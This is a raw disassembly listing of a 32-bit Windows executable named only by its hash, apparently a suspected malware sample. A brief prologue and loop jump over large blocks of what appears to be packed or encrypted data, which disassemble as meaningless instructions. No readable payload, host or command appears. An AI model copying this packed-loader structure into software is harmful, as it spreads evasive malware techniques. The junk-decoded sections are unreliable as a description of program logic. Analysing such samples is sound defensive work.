
a7b1a3545b03a8dcc9eccde3f35e807f617a768dfcb7915a0320d0d6ef98f7fb.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    eax,ds:0x413bde
  40100e:	mov    DWORD PTR [ebp-0x18],eax
  401011:	jmp    0x40141f
  401016:	adc    BYTE PTR [ebp+esi*8-0x5e940e36],0x54
  40101e:	(bad)  
  40101f:	shr    DWORD PTR ds:0xe7781708,cl
  401025:	dec    esp
  401026:	jle    0x4010a6
  401028:	jle    0x4010a8
  40102a:	outs   dx,DWORD PTR ds:[esi]
  40102b:	jge    0x4010ab
  40102d:	jle    0x400ffd
  40102f:	xlat   BYTE PTR ds:[ebx]
  401030:	cmp    eax,0xcfd339d5
  401035:	rol    edx,1
  401037:	pop    es
  401038:	add    al,0x3
  40103a:	add    BYTE PTR [ebx+0xf330f00],dl
  401040:	rcr    BYTE PTR [eax],0xc7
  401043:	adc    BYTE PTR [edi],bl
  401045:	mov    ecx,0xddb70058
  40104a:	push   cs
  40104b:	out    dx,eax
  40104c:	mov    ebp,0x8e03d6db
  401051:	es mov esi,0x1541a2f4
  401057:	lods   eax,DWORD PTR ds:[esi]
  401058:	fiadd  WORD PTR [esi+0x1f]
  40105b:	data16 in al,dx
  40105d:	outs   dx,DWORD PTR ds:[esi]
  40105e:	or     edx,DWORD PTR [ecx]
  401060:	pushf  
  401061:	js     0x401039
  401063:	inc    eax
  401064:	stos   BYTE PTR es:[edi],al
  401065:	push   ebx
  401066:	sub    eax,0xad3cc4d1
  40106b:	mov    bh,BYTE PTR [ebx-0x3b]
  40106e:	stos   DWORD PTR es:[edi],eax
  40106f:	push   es
  401070:	(bad)  
  401071:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401077:	jmp    0x4010a9
  401079:	mov    ebp,ecx
  40107b:	dec    edi
  40107c:	out    0xa6,al
  40107e:	inc    ecx
  40107f:	call   DWORD PTR [edi-0x2556f868]
  401085:	mov    ebp,0x5536ed4d
  40108a:	and    esi,DWORD PTR [edx-0x43619116]
  401090:	jnp    0x4010a3
  401092:	ret    
  401093:	xchg   edx,eax
  401094:	and    esp,edx
  401096:	jmp    0x4010f6
  401098:	ret    0xb8e4
  40109b:	lock jmp 0xd765:0x74cf3192
  4010a3:	and    ch,cl
  4010a5:	add    bl,cl
  4010a7:	adc    DWORD PTR [ecx-0x5a],edx
  4010aa:	xor    eax,0x78616f03
  4010af:	or     BYTE PTR [ecx],dh
  4010b1:	fisttp QWORD PTR [esi+0x7f752854]
  4010b7:	(bad)
  4010bc:	or     ebx,DWORD PTR [ebx+0x55]
  4010bf:	fst    st(6)
  4010c1:	or     ebx,edx
  4010c3:	pop    esp
  4010c4:	fstp   DWORD PTR [ecx]
  4010c6:	jno    0x401066
  4010c8:	inc    esi
  4010c9:	dec    ebx
  4010ca:	aaa    
  4010cb:	adc    eax,0x1a29772b
  4010d0:	sar    DWORD PTR [esi],cl
  4010d2:	dec    edi
  4010d3:	call   0xdd71b5a5
  4010d8:	xor    edi,eax
  4010da:	cld    
  4010db:	cs jmp 0xc37c4dca
  4010e1:	pushf  
  4010e2:	push   cs
  4010e3:	aad    0xef
  4010e5:	jnp    0x4010f7
  4010e7:	test   DWORD PTR [edi+0x204eec],esp
  4010ed:	ret    
  4010ee:	and    cl,cl
  4010f0:	or     eax,0x611ac19f
  4010f5:	mov    eax,ds:0x5016f54d
  4010fa:	add    al,0xb2
  4010fc:	stos   DWORD PTR es:[edi],eax
  4010fd:	and    ch,bh
  4010ff:	fbstp  TBYTE PTR [esi+0x347e912e]
  401105:	pop    es
  401106:	loopne 0x4010d2
  401108:	sbb    ebp,ebp
  40110a:	xchg   DWORD PTR [ecx+0x566d992],esi
  401110:	ret    
  401111:	loopne 0x401176
  401113:	xor    al,0x1e
  401115:	out    0xce,al
  401117:	frstor [edx-0x30f328c1]
  40111d:	enter  0xc8d3,0x0
  401121:	push   ebp
  401122:	dec    ecx
  401123:	scas   al,BYTE PTR es:[edi]
  401124:	dec    edx
  401125:	jnp    0x40110b
  401127:	out    0xd3,al
  401129:	out    0xec,eax
  40112b:	push   esi
  40112c:	fild   WORD PTR [ebp+0x7acfba1]
  401132:	iret   
  401133:	aad    0x2
  401135:	mov    esi,0x307846db
  40113a:	mov    edx,0xa951a7fe
  40113f:	repnz adc BYTE PTR [edx],ah
  401142:	jns    0x4010d2
  401144:	(bad)  [edi-0x15]
  401147:	stos   DWORD PTR es:[edi],eax
  401148:	scas   al,BYTE PTR es:[edi]
  401149:	cli    
  40114a:	sbb    dx,di
  40114d:	adc    ah,dl
  40114f:	push   ebp
  401150:	xor    BYTE PTR [eax+eiz*2+0xb1cabc2],dl
  401157:	jg     0x401171
  401159:	(bad)  
  40115b:	cmp    BYTE PTR [eax+0x713f621b],ch
  401161:	outs   dx,BYTE PTR ds:[esi]
  401162:	sbb    eax,DWORD PTR [esi+ebx*4]
  401165:	jg     0x4011da
  401167:	pop    esi
  401168:	and    ebp,DWORD PTR [esi-0x68de015c]
  40116e:	xlat   BYTE PTR ds:[ebx]
  40116f:	scas   eax,DWORD PTR es:[edi]
  401170:	add    DWORD PTR [edi+ebp*2-0x74ecc8ba],eax
  401177:	mov    dh,0x6
  401179:	xor    DWORD PTR [ebx],ecx
  40117b:	sti    
  40117c:	ror    ecx,1
  40117e:	jbe    0x4011b4
  401180:	mov    bl,0x13
  401182:	pop    DWORD PTR ds:0xf7058071
  401188:	clc    
  401189:	adc    esp,ebx
  40118b:	adc    al,0x9
  40118d:	loopne 0x40113c
  40118f:	lds    edx,FWORD PTR [esi+0x14]
  401192:	push   ecx
  401193:	sbb    cl,bh
  401195:	lds    edx,FWORD PTR [edi+0x76]
  401198:	adc    al,0xd3
  40119a:	in     eax,0x3d
  40119c:	dec    esp
  40119d:	lds    ebx,FWORD PTR [ecx+esi*8+0x661cf37a]
  4011a4:	popa   
  4011a5:	out    dx,eax
  4011a6:	leave  
  4011a7:	fldenv [ecx+0x10]
  4011aa:	(bad)  
  4011ab:	aad    0xe3
  4011ad:	sar    DWORD PTR [ebx+ebp*1+0x61103a4],1
  4011b4:	inc    edi
  4011b5:	mov    ecx,DWORD PTR [ebp+0x43]
  4011b8:	nop
  4011b9:	or     eax,0x363a2bdb
  4011be:	ror    bh,1
  4011c0:	cmc    
  4011c1:	and    BYTE PTR [edx+0x4e],dh
  4011c4:	inc    ebx
  4011c5:	and    BYTE PTR [ecx-0x70],al
  4011c8:	cmp    eax,0x1a15adbc
  4011cd:	scas   al,BYTE PTR es:[edi]
  4011ce:	mov    esi,0xd007442b
  4011d3:	mov    bh,0xc7
  4011d5:	not    BYTE PTR [ebp+eiz*2-0x159157f1]
  4011dc:	jb     0x401215
  4011de:	push   0x68
  4011e0:	out    0x1e,eax
  4011e2:	push   ebp
  4011e3:	imul   ebp,DWORD PTR [ebx],0x3b28e721
  4011e9:	push   ds
  4011ea:	adc    DWORD PTR [esi],esp
  4011ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4011ed:	fidivr WORD PTR [edi-0x1d]
  4011f0:	xchg   ecx,eax
  4011f1:	xlat   BYTE PTR ds:[ebx]
  4011f2:	into   
  4011f3:	mov    al,0x92
  4011f5:	aad    0xf0
  4011f7:	jl     0x401186
  4011f9:	mov    dl,0x68
  4011fb:	aad    0x32
  4011fd:	pop    ebx
  4011fe:	xlat   BYTE PTR ds:[ebx]
  4011ff:	adc    eax,0xe3c14f21
  401204:	aas    
  401205:	xchg   edi,eax
  401206:	jmp    0x4011af
  401208:	stos   DWORD PTR es:[edi],eax
  401209:	test   al,0xb5
  40120b:	xchg   edi,ecx
  40120d:	(bad)  [eax+0x3c]
  401210:	mov    dh,cl
  401212:	cmp    al,0xd9
  401214:	xchg   esp,eax
  401215:	xchg   edi,eax
  401216:	lds    esi,FWORD PTR [ebx]
  401218:	mov    esi,DWORD PTR [ebp+0x1a2fd177]
  40121e:	or     ebx,DWORD PTR [ebp-0x13]
  401221:	lea    eax,[edx]
  401223:	mov    esp,0x800cdfd2
  401228:	adc    BYTE PTR [eax-0x51],0x44
  40122c:	push   cs
  40122d:	xor    DWORD PTR ds:[ebx+ebp*1],eax
  401231:	inc    edi
  401232:	jmp    0x4011da
  401234:	mov    cl,0xc5
  401236:	add    DWORD PTR [edi+0x4a],0xf1180863
  40123d:	push   0xffffff91
  40123f:	lahf   
  401240:	icebp  
  401241:	pusha  
  401242:	pushf  
  401243:	ja     0x401200
  401245:	dec    esi
  401246:	pop    ebp
  401247:	xchg   esp,eax
  401248:	jmp    0x4012ae
  40124a:	loop   0x401206
  40124c:	jnp    0x4012ca
  40124e:	jno    0x401237
  401250:	dec    ecx
  401251:	std    
  401252:	xchg   ebx,eax
  401253:	pop    ss
  401254:	mov    esi,0x45bee289
  401259:	jge    0x4012a0
  40125b:	push   ecx
  40125c:	das    
  40125d:	cli    
  40125e:	fmul   DWORD PTR [edx]
  401260:	mov    dl,0xa4
  401262:	xor    al,0xb2
  401264:	test   BYTE PTR [edi+0x6a36af87],0x1b
  40126b:	mov    esp,DWORD PTR [eax+ebp*8-0x1f]
  40126f:	cmp    edx,DWORD PTR [edi-0x79]
  401272:	scas   al,BYTE PTR es:[edi]
  401273:	loopne 0x401269
  401275:	loop   0x4012a5
  401277:	push   0xb
  401279:	out    0x89,al
  40127b:	call   0x4ccb9133
  401280:	ret    0x5e2a
  401283:	add    BYTE PTR [ebx+0x14255c61],cl
  401289:	push   ds
  40128a:	rcr    BYTE PTR [ebp+edi*2-0x49ee1879],1
  401291:	fidiv  WORD PTR [ecx-0x28]
  401294:	add    DWORD PTR [edi],edi
  401296:	sub    al,0xdd
  401298:	mov    gs,WORD PTR [ebx-0xd48eda8]
  40129e:	add    edi,DWORD PTR ds:0x7fd9882d
  4012a4:	mov    dl,0xe5
  4012a6:	adc    DWORD PTR [ebx],ecx
  4012a8:	daa    
  4012a9:	jbe    0x401315
  4012ab:	sub    ebx,DWORD PTR [edi+ecx*8+0x4ee785c]
  4012b2:	cs inc edx
  4012b4:	stos   DWORD PTR es:[edi],eax
  4012b5:	pslld  mm3,mm0
  4012b8:	pop    ds
  4012b9:	push   es
  4012ba:	and    esp,DWORD PTR [esi-0x192773d9]
  4012c0:	mov    ds:0x8efcee29,al
  4012c5:	and    edi,DWORD PTR [edi+ebx*1+0x198a5f16]
  4012cc:	jmp    0xf97f099f
  4012d1:	fsub   QWORD PTR [eiz*4-0x51391901]
  4012d8:	sbb    DWORD PTR [edi],0x4d
  4012db:	inc    esi
  4012dc:	add    dh,BYTE PTR [ebp-0x37]
  4012df:	int    0x0
  4012e1:	std    
  4012e2:	sub    ecx,DWORD PTR [ebp+0x1a]
  4012e5:	jecxz  0x401349
  4012e7:	adc    BYTE PTR [ebp+0x1d],0x14
  4012eb:	mov    edx,0xe13b0af2
  4012f0:	ds and eax,0x4f60a9ca
  4012f6:	sbb    al,0xc5
  4012f8:	sub    edx,DWORD PTR [edi+ebp*1-0x75]
  4012fc:	jle    0x40133e
  4012fe:	mov    esp,0x69d09766
  401303:	outs   dx,DWORD PTR ds:[esi]
  401304:	jbe    0x401384
  401306:	out    dx,al
  401307:	out    dx,al
  401308:	stos   DWORD PTR es:[edi],eax
  401309:	cmp    eax,0xffe19988
  40130e:	push   0xf8d52876
  401313:	cmp    dl,al
  401315:	jne    0x4012f3
  401317:	icebp  
  401318:	or     al,0xc3
  40131a:	sub    al,0x1b
  40131c:	sbb    BYTE PTR [ecx],al
  40131e:	mov    ebp,0xd9aca81
  401323:	sub    DWORD PTR [eax],0x51cb7132
  401329:	pop    edx
  40132a:	and    ebx,edi
  40132c:	xchg   edx,eax
  40132d:	rcr    dh,1
  40132f:	dec    esi
  401330:	inc    esi
  401331:	add    al,0xd7
  401333:	and    DWORD PTR [edi+0x5],edx
  401336:	xor    ah,bh
  401338:	imul   ebx,DWORD PTR [edx],0x82365a90
  40133e:	test   al,0xfe
  401340:	imul   esp,ecx,0x53
  401343:	pop    ss
  401344:	mov    ds:0x1db04e89,eax
  401349:	mov    ds,WORD PTR [ebp-0x7]
  40134c:	enter  0x6358,0x27
  401350:	inc    ebx
  401351:	xchg   esp,eax
  401352:	xor    eax,0x5fea0655
  401357:	mov    ecx,0xcd04e99c
  40135c:	hlt    
  40135d:	in     eax,0x38
  40135f:	jae    0x4013cd
  401361:	aas    
  401362:	icebp  
  401363:	call   0xb3b9:0xe94c6f98
  40136a:	stc    
  40136b:	dec    esi
  40136c:	cmp    cl,dl
  40136e:	push   es
  40136f:	cmp    ah,bl
  401371:	or     dl,BYTE PTR [ecx-0x60f86da3]
  401377:	xchg   edx,eax
  401378:	hlt    
  401379:	into   
  40137a:	das    
  40137b:	add    al,0x5c
  40137d:	(bad)  [ecx]
  40137f:	adc    dh,BYTE PTR [edx+0x64963eeb]
  401385:	jg     0x4013c9
  401387:	lods   al,BYTE PTR ds:[esi]
  401388:	jmp    0xae67:0x337f1ca2
  40138f:	or     esi,DWORD PTR [edx+0x31c18939]
  401395:	pop    edx
  401396:	xor    dl,BYTE PTR [eax]
  401398:	xchg   esp,eax
  401399:	jle    0x4013be
  40139b:	mov    DWORD PTR [esp+ebx*8-0x6b38f65f],esi
  4013a2:	popa   
  4013a3:	add    BYTE PTR [esp+ebp*1],dl
  4013a6:	hlt    
  4013a7:	pushf  
  4013a8:	dec    ebp
  4013a9:	or     DWORD PTR [esi],ecx
  4013ab:	or     BYTE PTR [edi-0x58658270],dh
  4013b1:	mov    ch,0x9e
  4013b3:	xor    BYTE PTR [eax+ecx*4],bh
  4013b6:	jno    0x4013d7
  4013b8:	popf   
  4013b9:	xchg   esp,eax
  4013ba:	jp     0x401431
  4013bc:	pop    edx
  4013bd:	jmp    0x40142c
  4013bf:	jge    0x4013aa
  4013c1:	inc    eax
  4013c2:	lods   al,BYTE PTR ds:[esi]
  4013c3:	push   es
  4013c4:	mov    ecx,0x5f30b74
  4013c9:	adc    BYTE PTR [ebx+0x6234005d],dh
  4013cf:	xchg   esi,eax
  4013d1:	fcomp  QWORD PTR [ebp-0x19138be2]
  4013d7:	pop    es
  4013d8:	mov    edx,edx
  4013da:	jecxz  0x40140f
  4013dc:	(bad)  
  4013dd:	mov    bl,0xb5
  4013df:	cmp    ecx,DWORD PTR [esi]
  4013e1:	adc    cl,BYTE PTR [ebx-0x39b820be]
  4013e7:	pushf  
  4013e8:	xchg   esi,eax
  4013ea:	pop    esp
  4013eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013ec:	mov    esi,DWORD PTR [ebx-0x2f]
  4013ef:	push   eax
  4013f0:	sbb    DWORD PTR [ebp-0x28],0xe3f99d99
  4013f7:	cdq    
  4013f8:	dec    edx
  4013f9:	dec    esi
  4013fa:	mov    edi,0xff2eafc9
  4013ff:	out    dx,al
  401400:	in     al,dx
  401401:	les    edi,FWORD PTR [eax-0x2d40a164]
  401407:	or     esp,ecx
  401409:	xor    eax,0xac6a421d
  40140e:	out    dx,al
  40140f:	xchg   DWORD PTR [esi],ebx
  401411:	lahf   
  401412:	xor    al,0x59
  401414:	jp     0x4013b4
  401416:	sbb    eax,0x63d4e3cb
  40141b:	push   ss
  40141c:	pop    ecx
  40141d:	test   al,dh
  40141f:	mov    eax,ds:0x413cee
  401424:	mov    DWORD PTR [ebp-0x48],eax
  401427:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40142e:	adc    eax,0x6013
  401433:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  40143a:	adc    eax,ecx
  40143c:	mov    eax,DWORD PTR [ebp-0x10]
  40143f:	mov    ecx,DWORD PTR ds:0x43374b
  401445:	mov    ecx,DWORD PTR [ecx]
  401447:	or     DWORD PTR ds:0x433773,ecx
  40144d:	push   ebx
  40144e:	push   esi
  40144f:	sbb    DWORD PTR ds:0x4337eb,edi
  401455:	mov    esi,0x7510854
  40145a:	movzx  ecx,BYTE PTR ds:0x4337f3
  401461:	sbb    DWORD PTR ds:0x4337ef,ecx
  401467:	xor    eax,esi
  401469:	and    ebx,ecx
  40146b:	push   edi
  40146c:	mov    DWORD PTR ds:0x433843,0x1c
  401476:	cmp    DWORD PTR ds:0x433843,0x0
  40147d:	je     0x4014ab
  401483:	cmp    DWORD PTR ds:0x433843,0x25
  40148a:	jne    0x401499
  401490:	push   DWORD PTR [ebp-0x20]
  401493:	call   DWORD PTR ds:0x412288
  401499:	mov    ebx,DWORD PTR ds:0x433843
  40149f:	dec    ebx
  4014a0:	mov    DWORD PTR ds:0x433843,ebx
  4014a6:	jmp    0x401476
  4014ab:	mov    edi,0x32729b
  4014b0:	jmp    0x4018be
  4014b5:	xchg   ecx,eax
  4014b6:	mov    ds:0x59f479c4,eax
  4014bb:	push   ecx
  4014bc:	mov    bl,0x68
  4014be:	push   ebp
  4014bf:	out    dx,eax
  4014c0:	xor    edx,DWORD PTR [ebx]
  4014c2:	icebp  
  4014c3:	add    edi,DWORD PTR [edi+0x7e7e7d6f]
  4014c9:	outs   dx,DWORD PTR ds:[esi]
  4014ca:	jge    0x40154a
  4014cc:	jle    0x40147d
  4014ce:	dec    edx
  4014cf:	pushf  
  4014d0:	inc    ebp
  4014d1:	pop    esi
  4014d2:	dec    edx
  4014d3:	mov    dh,0x37
  4014d5:	mov    bh,0xdf
  4014d7:	sub    bh,BYTE PTR [edi-0x70]
  4014da:	sbb    eax,0xc0cae47e
  4014df:	xchg   ebx,eax
  4014e0:	dec    edi
  4014e1:	xor    al,0x8f
  4014e3:	cwde   
  4014e4:	jne    0x40154f
  4014e6:	cdq    
  4014e7:	out    dx,eax
  4014e8:	cmp    edi,DWORD PTR [ebp+0x69]
  4014eb:	sub    eax,0x3d4a908e
  4014f0:	fs int 0xd7
  4014f3:	push   cs
  4014f4:	fsubrp st(6),st
  4014f6:	not    BYTE PTR [ebp+0x2]
  4014f9:	jle    0x401575
  4014fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014fc:	mov    WORD PTR [ebx+0x4714379b],ds
  401502:	jmp    0xe4c0:0xcd83906
  401509:	jo     0x401565
  40150b:	mul    DWORD PTR [esi+0x5c]
  40150e:	cmp    BYTE PTR [edx+0x7e722ee9],0xd7
  401515:	ins    BYTE PTR es:[edi],dx
  401516:	mov    ecx,0xd489297f
  40151b:	push   ebx
  40151c:	fcom   QWORD PTR [esi+0x37b3eb71]
  401522:	int3   
  401523:	icebp  
  401524:	mov    dl,0xe5
  401526:	ror    BYTE PTR [eax],0x28
  401529:	and    al,0x33
  40152b:	xor    ebp,DWORD PTR [edi]
  40152d:	or     DWORD PTR [esp+edx*8+0x1f50abef],edi
  401534:	in     eax,0x4b
  401536:	jecxz  0x40156b
  401538:	xchg   DWORD PTR [ecx-0x29f6f9a9],ebx
  40153e:	and    DWORD PTR [bp+di-0x11],0xffffffec
  401543:	lahf   
  401544:	add    BYTE PTR [eax],al
  401546:	pop    ebp
  401547:	jns    0x40156b
  401549:	inc    esi
  40154a:	mov    edx,0x57ce918a
  40154f:	mov    ds:0x67e5d50a,al
  401554:	mov    ebp,0x4ab77786
  401559:	mov    edx,DWORD PTR [eax]
  40155b:	es sbb ebx,eax
  40155e:	call   0xb482:0x56e17df9
  401565:	bound  edx,QWORD PTR [ebp+0x196b0411]
  40156b:	(bad)  
  40156c:	in     eax,0xc3
  40156e:	test   ebp,0x9d07b767
  401574:	adc    al,0x68
  401576:	mov    ds:0xd255c464,al
  40157b:	jmp    0x4b6422ef
  401580:	retf   0xa5e0
  401583:	jne    0x4015cd
  401585:	push   ebx
  401586:	xor    eax,0x25f36edb
  40158b:	rcl    DWORD PTR [ebx],0x89
  40158e:	dec    esp
  40158f:	lods   al,BYTE PTR ds:[esi]
  401590:	stc    
  401591:	fwait
  401592:	jecxz  0x40155e
  401594:	fwait
  401595:	add    ebp,ecx
  401597:	test   al,0x22
  401599:	lahf   
  40159a:	mov    edx,esp
  40159c:	cmp    BYTE PTR [ecx],bl
  40159e:	fcmovu st,st(0)
  4015a0:	and    eax,0x7dae6008
  4015a5:	(bad)  [ebp-0x8486551]
  4015ab:	pcmpeqd mm2,QWORD PTR [ecx-0x16]
  4015af:	pushf  
  4015b0:	inc    edx
  4015b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015b2:	push   0x1c490f13
  4015b7:	inc    ebp
  4015b8:	sti    
  4015b9:	mov    ebx,0x90a179d0
  4015be:	jmp    0x238d:0xff67ca62
  4015c5:	ja     0x401551
  4015c7:	cmp    esp,edx
  4015c9:	data16 xlat BYTE PTR ds:[ebx]
  4015cb:	fisub  DWORD PTR [eax+0x62]
  4015ce:	imul   ecx,ebp,0xffffffd7
  4015d1:	pop    esp
  4015d2:	mov    esp,DWORD PTR [edx]
  4015d4:	adc    esp,DWORD PTR [edi]
  4015d6:	dec    eax
  4015d7:	jb     0x401615
  4015d9:	fucomip st,st(1)
  4015db:	std    
  4015dc:	fs dec esp
  4015de:	popf   
  4015df:	inc    ebx
  4015e0:	xchg   esi,eax
  4015e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e2:	adc    eax,0x175d6fb7
  4015e7:	jecxz  0x401662
  4015e9:	adc    eax,0x46ead6dc
  4015ee:	(bad)  
  4015ef:	cli    
  4015f0:	pusha  
  4015f1:	add    edi,DWORD PTR [eax+esi*2]
  4015f4:	mov    dl,BYTE PTR [esi-0x6]
  4015f7:	dec    esp
  4015f8:	shl    BYTE PTR [esi+0x1e7c5a3e],cl
  4015fe:	cmp    DWORD PTR [edx-0x43],ebp
  401601:	int    0xb5
  401603:	not    BYTE PTR [edx-0x67]
  401606:	in     eax,0xca
  401608:	jne    0x4015ce
  40160a:	sbb    ebx,ecx
  40160c:	into   
  40160d:	mov    BYTE PTR [ebp+0x104499b7],ch
  401613:	push   edx
  401614:	neg    BYTE PTR [edx-0x15]
  401617:	daa    
  401618:	je     0x4015cf
  40161a:	adc    al,0xd8
  40161c:	ins    DWORD PTR es:[edi],dx
  40161d:	xor    edx,DWORD PTR [edx+0x90c2f84]
  401623:	cmp    al,0x4b
  401625:	(bad)  
  401626:	ret    0xe4cc
  401629:	add    eax,0xa37fc255
  40162e:	xchg   ebx,eax
  40162f:	in     eax,dx
  401630:	or     BYTE PTR [ebx+0x693fef5a],cl
  401636:	push   ebp
  401637:	mov    al,0x8a
  401639:	retf   
  40163a:	repnz add DWORD PTR [ecx+0x7b],ebx
  40163e:	xchg   ebx,eax
  40163f:	pop    ss
  401640:	add    DWORD PTR [edi-0x7f],0x57
  401644:	mov    al,ds:0x11488155
  401649:	xlat   BYTE PTR ds:[ebx]
  40164a:	mov    ch,0xf9
  40164c:	or     BYTE PTR [ebp-0x2fb36291],bl
  401652:	js     0x4016a7
  401654:	dec    esp
  401655:	push   ecx
  401656:	inc    ebx
  401657:	add    eax,0x3a8de34a
  40165c:	arpl   WORD PTR [ecx+0x13],cx
  40165f:	xchg   esi,eax
  401660:	aas    
  401661:	nop
  401662:	cmp    bh,BYTE PTR [ebx]
  401664:	or     ebx,DWORD PTR [ecx]
  401666:	sub    al,BYTE PTR [eax+0x5a]
  401669:	sub    eax,0xa3af7a1b
  40166e:	push   0xe9ec08fc
  401673:	mov    dh,BYTE PTR [edx]
  401675:	repz neg BYTE PTR [ebx-0x15253b0e]
  40167c:	sbb    esp,DWORD PTR [edx+0x1c798007]
  401682:	out    dx,al
  401683:	jle    0x401619
  401685:	mov    WORD PTR [ecx-0x35d8b73e],ds
  40168b:	mov    ds:0x59353735,al
  401690:	ficom  DWORD PTR [ebx-0x306d4609]
  401696:	mov    eax,ds:0x73bc4074
  40169b:	and    ebp,ebx
  40169d:	inc    ecx
  40169e:	mov    bl,0xd1
  4016a0:	jecxz  0x40167c
  4016a2:	and    edi,DWORD PTR [eax-0x5177e01]
  4016a8:	popf   
  4016a9:	dec    ecx
  4016aa:	and    DWORD PTR [edi+0x7b4d1aa7],0x6a642752
  4016b4:	int3   
  4016b5:	jb     0x40167e
  4016b7:	mov    al,0x45
  4016b9:	inc    ebp
  4016ba:	test   al,0x9f
  4016bc:	mov    DWORD PTR [eax],edi
  4016be:	daa    
  4016bf:	mov    gs,WORD PTR [ebx+0x3eee005c]
  4016c5:	test   DWORD PTR [ecx-0x4c1fb030],ebp
  4016cb:	retf   
  4016cc:	(bad)  
  4016cd:	lea    esp,[ebp-0x78ebdf3e]
  4016d3:	jo     0x4016b8
  4016d5:	mov    dl,0xb
  4016d7:	and    esi,esi
  4016d9:	iret   
  4016da:	mov    DWORD PTR [ebp+0x1681fc28],esp
  4016e0:	pusha  
  4016e1:	repz sbb al,0xe7
  4016e4:	test   DWORD PTR [ecx+esi*4],esp
  4016e7:	mov    cl,0x61
  4016e9:	jne    0x401732
  4016eb:	inc    edi
  4016ec:	nop    DWORD PTR [esi+0x18]
  4016f0:	mov    edx,0x7f3d5148
  4016f5:	jp     0x70a17ab4
  4016fb:	pop    ecx
  4016fc:	adc    edx,DWORD PTR cs:[edx+0x3c]
  401700:	sar    BYTE PTR [ebx-0x3],0xa6
  401704:	or     edi,edx
  401706:	mov    edx,0x4995c444
  40170b:	fidiv  DWORD PTR [edi]
  40170d:	or     esp,0xffffff9c
  401710:	mov    dh,BYTE PTR [ecx-0x242df1bd]
  401716:	jge    0x4016d8
  401718:	shl    ebx,0x9
  40171b:	sub    BYTE PTR [esi*8-0x62c9bc55],cl
  401722:	push   ds
  401723:	dec    ecx
  401724:	push   esi
  401725:	in     al,dx
  401726:	push   edi
  401727:	mov    dl,0x6
  401729:	xor    BYTE PTR [ebx+0x14a43271],0xcc
  401730:	ins    BYTE PTR es:[edi],dx
  401731:	shl    BYTE PTR [ebx],1
  401733:	inc    edx
  401734:	repnz push ecx
  401736:	addr16 in al,dx
  401738:	mov    dl,0x7c
  40173a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173b:	(bad)  
  40173c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173d:	push   ecx
  40173e:	test   dl,dh
  401740:	stc    
  401741:	adc    al,0xb7
  401743:	lods   eax,DWORD PTR ds:[esi]
  401744:	mov    al,0x9
  401746:	sbb    ecx,edi
  401748:	dec    ecx
  401749:	dec    eax
  40174a:	lahf   
  40174b:	inc    esi
  40174c:	bound  esp,QWORD PTR [esi]
  40174e:	into   
  40174f:	sub    edi,DWORD PTR [ebx]
  401751:	repnz pop ebx
  401753:	mov    ?,WORD PTR [edi]
  401755:	xor    cl,ch
  401757:	xor    al,0x59
  401759:	xchg   ecx,eax
  40175a:	imul   ebp,ebx,0xf38dad1e
  401760:	bound  ebp,QWORD PTR [edi-0x56]
  401763:	ds daa 
  401765:	ror    DWORD PTR [ecx],0x1e
  401768:	jmp    0x38fb2b78
  40176d:	cli    
  40176e:	lods   al,BYTE PTR ds:[esi]
  40176f:	lock nop
  401771:	push   ecx
  401772:	loop   0x4017cf
  401774:	sub    DWORD PTR [eax-0x23],edx
  401777:	jmp    0x2dc9fff
  40177c:	sbb    al,0x95
  40177e:	or     cl,BYTE PTR [ebp+0x504dbd4a]
  401784:	and    dh,BYTE PTR [ecx+0x25]
  401787:	(bad)  
  401788:	mov    bh,0x7
  40178a:	push   esp
  40178b:	cmp    BYTE PTR [edi],ah
  40178d:	cs popf 
  40178f:	ficomp DWORD PTR [ebp+0xcd5ace6]
  401795:	aas    
  401796:	dec    ecx
  401797:	push   edi
  401798:	pusha  
  401799:	mov    cl,0x2e
  40179b:	ror    BYTE PTR [eax+0x1d71037],cl
  4017a1:	fs xchg edi,eax
  4017a3:	out    dx,eax
  4017a4:	cli    
  4017a5:	pop    eax
  4017a6:	fwait
  4017a7:	pop    esp
  4017a8:	mov    eax,0x36f1e697
  4017ad:	ror    DWORD PTR [ecx],0x41
  4017b0:	clc    
  4017b1:	(bad)  [eax]
  4017b3:	inc    esi
  4017b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017b5:	jle    0x401822
  4017b7:	sbb    ebx,DWORD PTR [edx+0x36afac6b]
  4017bd:	repz push ecx
  4017bf:	inc    ebp
  4017c0:	xchg   ecx,eax
  4017c1:	lahf   
  4017c2:	es lahf 
  4017c4:	cwde   
  4017c5:	jnp    0x4017e9
  4017c7:	mov    cl,0x4b
  4017c9:	test   dl,cl
  4017cb:	aaa    
  4017cc:	or     ah,al
  4017ce:	(bad)  
  4017cf:	and    DWORD PTR [edx-0x4c07e9b7],ebx
  4017d5:	aad    0x1f
  4017d7:	add    dh,0x94
  4017da:	fmul   QWORD PTR [eax+0xf]
  4017dd:	mov    dl,0x8c
  4017df:	lock sbb BYTE PTR [ecx],dh
  4017e2:	test   DWORD PTR [ebx],ebx
  4017e4:	out    0xed,al
  4017e6:	xchg   esi,eax
  4017e7:	(bad)  
  4017e8:	lea    esi,[edx]
  4017ea:	jae    0x4017e1
  4017ec:	ins    DWORD PTR es:[edi],dx
  4017ed:	sti    
  4017ee:	sbb    al,0x63
  4017f0:	cmp    eax,0xcff0ed25
  4017f5:	mov    DWORD PTR [edi-0x79],0x18212c66
  4017fc:	push   ecx
  4017fd:	sbb    ebp,DWORD PTR ds:0x55381bfd
  401803:	fisttp QWORD PTR [eax]
  401805:	leave  
  401806:	scas   al,BYTE PTR es:[edi]
  401807:	sub    eax,0x5581f6f8
  40180c:	pop    eax
  40180d:	mov    ds:0x8b733100,al
  401812:	data16 jecxz 0x401862
  401815:	or     al,0xf9
  401817:	mov    ecx,0xddf006f2
  40181c:	js     0x401859
  40181e:	or     al,0x18
  401820:	add    esi,ecx
  401822:	adc    ebx,DWORD PTR [edi+0x28]
  401825:	lea    esi,[edi]
